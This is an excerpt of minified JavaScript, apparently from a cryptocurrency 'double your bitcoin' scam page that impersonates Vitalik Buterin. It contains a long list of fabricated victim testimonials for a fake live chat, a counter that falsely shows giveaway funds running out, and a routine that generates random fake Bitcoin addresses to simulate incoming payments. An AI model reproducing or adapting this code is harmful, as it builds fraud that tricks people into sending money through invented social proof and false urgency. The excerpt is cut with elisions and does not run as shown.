...
(() => {
    ...
    let c = ["Never seen anyrhing like that, but lucky it worked! Thanks.", "Got 0.78 btc THANK YOU VITALIK", "NEVER DOUBT VITAL", "HI!", "I GOT FUCKING 3.7 OMG", "IM IN!!", "this is insane +4.0", "VERY NICE GUYS", "Recieved 97 000 bucks in btc OMG VITALIK BUTERIN I LOVE YOU!", "awesome offer can I use it 1 more time? I shouldve sent more...", "GOT 10", "wtf it worked", "May the God be with you.", "I was doubting for a long time if I should send here my 1 btc, but it actually worked for me so I got 1.42 btc now thanks to bitcoin.", "OH SHIT IT WORKS!!!!!!!", "thanks for 0.24 btc. fine here!", "OH FUCK I GOT THE RETURM ! THANKS", "Gracias papi", "0.2 btc", "crypto is a bubble...", "1 btc ON MY WALLET", "This is going to change my life!", "+240k", "HERE I AM, GOT $450k FUCKING INSANE THING!!!!!!", "VITALIK WE LOVE YOU!!!", "got 21 bits on my wallet now :)", "You better be fast guys!", "Vitalik never dissapoints!!", "+1.44", "I sold all by btc a day ago ;(", "GOTTA BUY A BRAND NEW CHEVY!! 18 thousand bucks", "+78K$. this is an actual nonsence", "GENEROUS PRESENT!", "I was lucky to get my $200,000.", "I CANT IMAGINE WHAT WILL HAPPEN WITH THE PRICE", "GOD BLESSF YOU !", "Hell yeah got my 250,000,000 doubled! ", "wish i hsd more money to send... +1 of btc", "ONE TIME OPPORTUNITY ", "0.72 btc", "OHHHH COME HERE $$$$$$", "Thank you Vitalik Buterin! From me and my son.", "0.12 btc !", "btc INU TO 100k$", "BIG PUMP IS COMING", "Thank you for everything.", "WHAAAAAAT??", "1.2 btc", "got 0.92 btc, not too much but thank you!", "I recieved 1.5 btc as well. This is a fine investment.", "CRYPTOKING!", "THANKS FOR THE NEW CAR", "God Bless!", "9.83 ye", "OH YES!", "+1.18", "btc TO THE MOON", "WOW", "+38.4K!!!!", "does it doubles the amount you send?", "Ill take my chances", "can I have more?", "I AM HAPPY", "OH YESSS 311K", "THANKS!", "+ 0.92 btc", "HOW IS THIS POSSIBLE?", "Hello everyone!", "WHAT", "THIS IS THE BEST", "How much left??????", "it took a couple of minutes but I got $13,000 ", "Really?", "THE KING!", "SpaceX launch soon?", "+ 20K bucks", "omg this is real!", "+13K", "I LOVE YOU", "THATS GOOD!", "Got some!", "HEYYY", "MY GOD", "2 btc? yeah", "how you doing guys? xD", "WOOOOOOOOW!!", "How can I contact bless?", "Unbeliveable charity!", "GOT 1.22!!!!!!!!", "Thats greatful!", "Changed my mind on btc. THANK YOU!", "1.82", "btc GOES 1mil$", "thanks much !!!!", "I want to participate again!!!!!!!!", "just recieved 2 btc", "Please give me some more!", "Very good.", "I CANT BELIEVE IT", "i actually got 0.022 btc back what the fuck?", "Tell your friends!", "+ 1.12", 'THAT"S BEAUTIFUL!', "GOT $200k OMG", "Too good!", "btc 4 LIFE", "I will remember this moment forever! Recieved 450,000", "Thank god Im on time", "THIS IS SICK!", "this is magic", "2,00 btc !!!", "Hi everyone :)", "HYPE!", "I love you!!", "I bless you btc!!", "+ btc 1.8", "thanks for letting me participate!", 'Should"ve deposited more....', "Hello!", "thanks for 0.22", "2 btc I CANT BELIVE MY EYES!!!!", "Im not gonna work again just trading :D", "OOOOMMMGG!!!!!!!!!!!!!!!!!", "Glad I figured all out! Now I got some money to invest.", "Thank god.", "LETS GO GUYS", "BTC $10k SOON", "+ 1.2 BTC !", "Chill out", "I got 0.2 btc", "GOOD LUCK EVERYONE! I gotr my cut already", "SO HAPPY!", "omg recieved 400k backl!!!!!", "recieived some btc thanks", "Who else if not blockstream could help us ", "Blockstream!!", "+ 1.98 btc!!!", "YEAH BITCH", "Im very thankful", "NEW btc ATH COMING", "Perfect", "WE LOVE YOU", "HI", "I WISH I HAD MORE btc TO SEND", "+0.66", "Thats for real", "IT IS ACTUAL", "AWESOME", "1.834", "btc GOES 100k$", "btc ROCKET"];
    ...
    const R = 25e1;
    localStorage.setItem("procent", 23e1), A.innerHTML = localStorage.getItem("procent").toLocaleString("en-EN");
    ...
    ! function e() {
        setTimeout((function() {
            let t = (o = 3, r = 5, Math.floor(Math.random() * (r - o + 1)) + o);
            var o, r;
            let n = M - t;
            if (n < M && n > 0) {
                g(A, M, M - t, 20);
            ...
            } else M = 235, L.setAttribute("stroke-dasharray", "60,100"), localStorage.setItem("procent", 235);
            I++, I < 30 && e()
        }), 5e3)
    }();
        ...
        let t = H(10),
            ...
            r = function() {
                ...
                if (y < 0.5)
                    ...
                    y = 1
                for (var e = "", t = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", o = t.length, r = 0; r < 8; r++) e += t.charAt(Math.floor(Math.random() * o));
                if (y === 0)
                    return "bc" + e;
                else
                    return "3" + e
